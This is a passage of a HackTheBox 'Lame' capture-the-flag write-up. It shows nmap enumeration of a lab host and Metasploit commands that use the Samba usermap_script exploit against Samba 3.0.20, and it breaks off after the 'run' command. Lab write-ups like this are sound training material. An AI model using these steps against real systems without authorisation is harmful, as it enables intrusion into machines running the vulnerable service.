### Introduction
HTB Lame is a starter level machine that can be easily exploited using metasploit and some googling. To exploit this box, you just need to know basic enumeration, linux services, and some googling

### Enumeration 
Using ```zenmap``` or doing ```nmap -sC -sV 10.10.10.3``` will reveal a few things:

- Ports 21, 22, 139, and 445 are open
- Port 21 has version vsftpd 2.3.4
- We are working with a linux system.

Port 20 and 21 are used for FTP. A [previous writeup](https://github.com/BurntxNoodle/PenetrationTesting/tree/master/HTB%20-%20Legacy) of mine explains what part 139 and 445 are used for. 

Here is the report from zenmap and nmap scan (both basically give the same info):
```
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT:

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

### Exploitation 
From doing previous challenges, I know that open SMB is very vulnerable. From the nmap/zenmap reports, we know that the version of SMB is smbd ```3.0.20 - Debian``` Looking up exploits for this version I ran across this [exploit](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script) with the metasploit module ```exploit/multi/samba/usermap_script```

Here's how I used metasploit:
```
msf > use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > 
msf exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
RHOST => 10.10.10.3

msf exploit(multi/samba/usermap_script) > run
